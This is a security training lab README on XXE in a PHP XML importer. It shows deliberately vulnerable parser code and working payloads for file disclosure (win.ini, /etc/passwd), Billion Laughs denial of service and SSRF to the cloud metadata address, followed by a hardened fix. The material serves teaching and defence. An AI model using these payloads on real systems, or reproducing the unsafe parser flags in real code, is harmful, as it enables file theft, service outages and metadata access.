# Lab 4 — XXE (XML External Entity)

**Goal:** Read a server-side file through the XML order importer, and crash/stall the parser with entity expansion.

## Files

- Vulnerable: `/lab4-xml/vulnerable/parse.php` — `LIBXML_NOENT | LIBXML_DTDLOAD`
- Secure: `/lab4-xml/fixed/parse_secure.php` — `DOCTYPE` rejected, `LIBXML_NONET`

Login comes from the shared app (`/login.php`).

## Vulnerable Code

```php
$xml = new DOMDocument();
$xml->loadXML($data, LIBXML_NOENT | LIBXML_DTDLOAD);
```

`NOENT` substitutes entities, `DTDLOAD` loads the inline DTD — including external `SYSTEM` entities (CWE-611). Unbounded expansion enables Billion Laughs (CWE-776).

## Attack

Login as `user2` / `123456`, paste each payload into the importer:

**1. File disclosure (XXE)** — Windows target (this lab runs on Windows):
```xml
<?xml version="1.0"?>
<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<order><item>&xxe;</item></order>
```
→ imported item contains `win.ini`. On Linux use `file:///etc/passwd`.

**2. Billion Laughs (DoS)** — no file path needed:
```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY a "xxxxxxxxxx"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<order><item>&c;</item></order>
```
→ exponential expansion stalls the parser (keep the entity counts small in the lab).

**3. SSRF flavor:** `<!ENTITY xxe SYSTEM "http://169.254.169.254/">` — parser performs server-side requests (cloud metadata in real targets).

## Fix

```php
libxml_disable_entity_loader(true);          // PHP < 8 hardening
if (preg_match('/<!DOCTYPE/i', $data)) {     // this importer needs no DTD
    die('DTDs are not allowed.');            // kills XXE + Billion Laughs
}
$xml->loadXML($data, LIBXML_NONET);          // no network, no substitution
```

Never pass `LIBXML_NOENT` / `LIBXML_DTDLOAD` to user-supplied XML. Dropping those flags alone is not enough — internal entities still expand — so reject `DOCTYPE` entirely when the feature doesn't need DTDs. Prefer JSON.

## Setup

Main setup only (`init.php` visited once).

- Vulnerable: `http://localhost/A022025-Security-Misconfiguration/lab4-xml/vulnerable/parse.php`
- Secure: `http://localhost/A022025-Security-Misconfiguration/lab4-xml/fixed/parse_secure.php` (XXE payloads print literally / rejected)

## CWE

- CWE-611: Improper Restriction of XML External Entity Reference (XXE)
- CWE-776: Improper Restriction of Recursive Entity References in DTDs (Billion Laughs)
